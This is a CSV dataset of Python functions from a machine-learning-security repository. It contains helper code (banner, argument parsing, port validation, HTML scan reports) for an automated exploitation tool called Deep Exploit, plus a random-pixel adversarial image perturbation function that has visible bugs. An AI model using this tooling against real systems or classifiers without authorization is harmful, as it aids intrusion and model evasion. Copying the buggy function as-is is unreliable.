Repository,Function_Name,Function_Code
13o-bbr-bbq/machine_learning_security,random_adv,"def random_adv(perturbation_filename, p):
    img = cv2.imread(TEST_DIR + perturbation_filename, cv2.IMREAD_UNCHANGED)
    if len(img) == 3:
        (height, width, channel) = img.shape[:3]
    else:
        (height, width) = img.shape[:2]
    for i in range(p):
        x = random.randint(0, width - 1)
        y = random.randint(0, height - 1)
        pixel = img[y, x]
        average = sum(pixel) / len(pixel)
        if average < 128:
            img[y, x] = [0, 0, 0]
        else:
            img[y, x] = [255, 255, 255]
    adv_filename = 'adv_' + filename
    cv2.imwrite(ADV_DIR + adv_filename, img)
    return adv_filename"
13o-bbr-bbq/machine_learning_security,predict,"def predict(target_filename, height, width):
    img = image.load_img(target_filename, target_size=(height, width))
    x = image.img_to_array(img)
    x = np.expand_dims(x, axis=0)
    x = x / 255.0
    pred = model.predict(x)[0]
    top = 1
    top_indices = pred.argsort()[-top:][::-1]
    result = [(classes[i], pred[i]) for i in top_indices]
    '\n    result[0][0] : predict label\n    result[0][1] : prediction probability\n    '
    return result"
13o-bbr-bbq/machine_learning_security,command_parse,"def command_parse():
    args = docopt(__doc__)
    mode = args['<mode>']
    start_time = args['<start>']
    return (mode, start_time)"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self):
    self.util = Utilty()
    full_path = os.path.dirname(os.path.abspath(__file__))
    config = configparser.ConfigParser()
    try:
        config.read(os.path.join(full_path, 'config.ini'))
    except Exception as err:
        self.util.print_exception(err, 'File exists error')
        sys.exit(1)
    self.report_date_format = config['Report']['date_format']
    self.report_test_path = os.path.join(full_path, config['Report']['report_test'])
    self.report_test_file = os.path.join(self.report_test_path, config['Report']['report_test_file'])
    self.template_test = config['Report']['template_test']
    self.report_train_path = os.path.join(self.report_test_path, config['Report']['report_train'])
    self.report_train_file = os.path.join(self.report_train_path, config['Report']['report_train_file'])
    self.template_train = config['Report']['template_train']
    self.header_train = str(config['Report']['header_train']).split('@')
    self.header_test = str(config['Report']['header_test']).split('@')"
13o-bbr-bbq/machine_learning_security,create_report,"def create_report(self, mode='train', start_date=None):
    if mode not in ['train', 'test']:
        self.util.print_message(FAIL, 'Invalid mode: {}'.format(mode))
        exit(1)
    if mode == 'train':
        self.util.print_message(NOTE, 'Creating training report.')
        csv_file_list = glob.glob(os.path.join(self.report_train_path, '*.csv'))
        content_list = []
        for file in csv_file_list:
            df = pd.read_csv(file, names=self.header_train, sep=',')
            df['date'] = pd.to_datetime(df['date'])
            selected_df = df[start_date < df['date']]
            content_list.append(selected_df)
        if len(content_list) != 0:
            df_csv = pd.concat(content_list).drop_duplicates().sort_values(by=['ip', 'port'], ascending=True).reset_index(drop=True, col_level=1)
            items = []
            for idx in range(len(df_csv)):
                items.append({'ip_addr': df_csv.loc[idx, 'ip'], 'port': df_csv.loc[idx, 'port'], 'prod_name': df_csv.loc[idx, 'service'], 'vuln_name': df_csv.loc[idx, 'vuln_name'], 'description': df_csv.loc[idx, 'description'], 'type': df_csv.loc[idx, 'type'], 'exploit': df_csv.loc[idx, 'exploit'], 'target': df_csv.loc[idx, 'target'], 'payload': df_csv.loc[idx, 'payload'], 'ref': str(df_csv.loc[idx, 'reference']).replace('@', '<br>')})
            try:
                env = Environment(loader=FileSystemLoader(self.report_train_path))
                template = env.get_template(self.template_train)
                pd.set_option('display.max_colwidth', -1)
                html = template.render({'title': 'Deep Exploit Scan Report', 'items': items})
                with codecs.open(self.report_train_file, 'w', 'utf-8') as fout:
                    fout.write(html)
            except Exception as err:
                self.util.print_exception(err, 'Creating report error.')
        else:
            self.util.print_message(WARNING, 'Exploitation result is not found.')
        self.util.print_message(OK, 'Creating training report done.')
    else:
        self.util.print_message(NOTE, 'Creating testing report.')
        csv_file_list = glob.glob(os.path.join(self.report_test_path, '*.csv'))
        content_list = []
        for file in csv_file_list:
            df = pd.read_csv(file, names=self.header_test, sep=',')
            df['date'] = pd.to_datetime(df['date'])
            selected_df = df[start_date < df['date']]
            content_list.append(selected_df)
        if len(content_list) != 0:
            df_csv = pd.concat(content_list).drop_duplicates().sort_values(by=['ip', 'port'], ascending=True).reset_index(drop=True, col_level=1)
            items = []
            for idx in range(len(df_csv)):
                items.append({'ip_addr': df_csv.loc[idx, 'ip'], 'port': df_csv.loc[idx, 'port'], 'source_ip_addr': df_csv.loc[idx, 'src_ip'], 'prod_name': df_csv.loc[idx, 'service'], 'vuln_name': df_csv.loc[idx, 'vuln_name'], 'description': df_csv.loc[idx, 'description'], 'type': df_csv.loc[idx, 'type'], 'exploit': df_csv.loc[idx, 'exploit'], 'target': df_csv.loc[idx, 'target'], 'payload': df_csv.loc[idx, 'payload'], 'ref': str(df_csv.loc[idx, 'reference']).replace('@', '<br>')})
            try:
                env = Environment(loader=FileSystemLoader(self.report_test_path))
                template = env.get_template(self.template_test)
                pd.set_option('display.max_colwidth', -1)
                html = template.render({'title': 'Deep Exploit Scan Report', 'items': items})
                with codecs.open(self.report_test_file, 'w', 'utf-8') as fout:
                    fout.write(html)
            except Exception as err:
                self.util.print_exception(err, 'Creating report error.')
        else:
            self.util.print_message(WARNING, 'Exploitation result is not found.')
        self.util.print_message(OK, 'Creating testing report done.')"
13o-bbr-bbq/machine_learning_security,show_banner,"def show_banner(util, delay_time=2.0):
    banner = u'\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n ██████╗ ███████╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗\n ██╔══██╗██╔════╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝\n ██║  ██║█████╗  █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   \n ██║  ██║██╔══╝  ██╔══╝  ██╔═══╝     ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   \n ██████╔╝███████╗███████╗██║         ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   \n ╚═════╝ ╚══════╝╚══════╝╚═╝         ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   (beta)\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n    '
    util.print_message(NONE, banner)
    show_credit(util)
    time.sleep(delay_time)"
13o-bbr-bbq/machine_learning_security,show_credit,"def show_credit(util):
    credit = u'\n       =[ Deep Exploit v0.0.2-beta                                            ]=\n+ -- --=[ Author  : Isao Takaesu (@bbr_bbq)                                   ]=--\n+ -- --=[ Website : https://github.com/13o-bbr-bbq/machine_learning_security/ ]=--\n    '
    util.print_message(NONE, credit)"
13o-bbr-bbq/machine_learning_security,is_valid_ip,"def is_valid_ip(rhost):
    try:
        ipaddress.ip_address(rhost)
        return True
    except ValueError:
        return False"
13o-bbr-bbq/machine_learning_security,command_parse,"def command_parse():
    args = docopt(__doc__)
    ip_addr = args['<ip_addr>']
    mode = args['<mode>']
    port = args['<port>']
    service = args['<product>']
    return (ip_addr, mode, port, service)"
13o-bbr-bbq/machine_learning_security,check_port_value,"def check_port_value(port=None, service=None):
    if port is not None:
        if port.isdigit() is False:
            Utilty().print_message(OK, 'Invalid port number: {}'.format(port))
            return False
        elif int(port) < 1 or int(port) > 65535:
            Utilty().print_message(OK, 'Invalid port number: {}'.format(port))
            return False
        elif port not in com_port_list:
            Utilty().print_message(OK, 'Not open port number: {}'.format(port))
            return False
        elif service is None:
            Utilty().print_message(OK, 'Invalid service name: {}'.format(str(service)))
            return False
        elif type(service) == 'int':
            Utilty().print_message(OK, 'Invalid service name: {}'.format(str(service)))
            return False
        else:
            return True
    else:
        return False"
